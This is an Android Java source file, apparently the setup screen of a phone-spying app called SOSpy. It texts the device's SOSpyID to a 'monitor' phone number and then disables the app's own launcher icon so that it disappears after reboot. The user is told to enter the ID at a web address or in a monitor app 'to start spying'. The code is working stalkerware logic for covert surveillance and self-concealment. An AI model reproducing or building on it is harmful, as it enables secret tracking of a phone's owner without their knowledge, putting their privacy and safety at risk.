package com.prestomation.android.sospy.spy;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.text.InputType;
import android.util.Log;
import android.widget.EditText;
import android.widget.TextView;

public class SetupActivity extends Activity {
	public static final String TAG = "SOSpy";

	private String mDevID = null;

	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) 
	{
		super.onCreate(savedInstanceState);
		

		mDevID = Prefs.getSOSpyID(this);

		setScreenContent(R.layout.greeting);
		
		

		
	}

	private void setScreenContent(int screenId) {
		// We only have one view, but we've got framework here incase this app
		// expands
		setContentView(screenId);

		switch (screenId) {
		case R.layout.greeting: {
			Log.i(TAG, "Entering greeting screen");
			setGreetingScreenContent();
			break;
		}

		}

	}

	private void setGreetingScreenContent() {
		// Format our greeting with the DevID and change the TextView
		String greeting = getString(R.string.greeting);
		String formattedGreeting = String.format(greeting, mDevID);
		TextView greetingText = (TextView) findViewById(R.id.greetingText);
		greetingText.setText(formattedGreeting);
		promptForIDDestination();

	}

	private void promptForIDDestination() {
		AlertDialog.Builder alert = new AlertDialog.Builder(this);

		alert.setTitle("Send SOSpyID to Monitor phone:");
		alert.setMessage("Please enter the phone number to SMS the SOSpyID");

		final EditText input = new EditText(this);
		input.setInputType(InputType.TYPE_CLASS_PHONE);
		alert.setView(input);
		alert.setPositiveButton("Send", new DialogInterface.OnClickListener() {
			public void onClick(DialogInterface dialog, int whichButton) {
				String smsNumber = input.getText().toString().trim().replaceAll("[()-]", "");
				sendSMS(smsNumber);

			}

		});

		alert.show();
	}

	private void sendSMS(String number) {
		PendingIntent pi = PendingIntent.getActivity(this, 0,
				new Intent(this, SetupActivity.class), 0);
		SmsManager sms = SmsManager.getDefault();
		Log.i(TAG, "Sending SOSpyID Text...");

		sms.sendTextMessage(number, null, mDevID, pi, null);
		Log.i(TAG, "Text sent");
		hideIcon();
	}

	private void hideIcon() {
		PackageManager p = getPackageManager();
		AlertDialog.Builder alert = new AlertDialog.Builder(this);

		alert.setTitle("Message sent:");
		alert
				.setMessage("You should be receiving an SMS with the SOSpyID shortly. Reboot this phone and the icon launcher should be gone."
						+ "Enter the SOSpyID at sospyer.appspot.com or into the SOSpy Monitor app to start spying.");
		alert.show();
		Log.i(TAG, "Disabling icon ");

		
		p.setComponentEnabledSetting(getComponentName(),
				PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		
	}
}
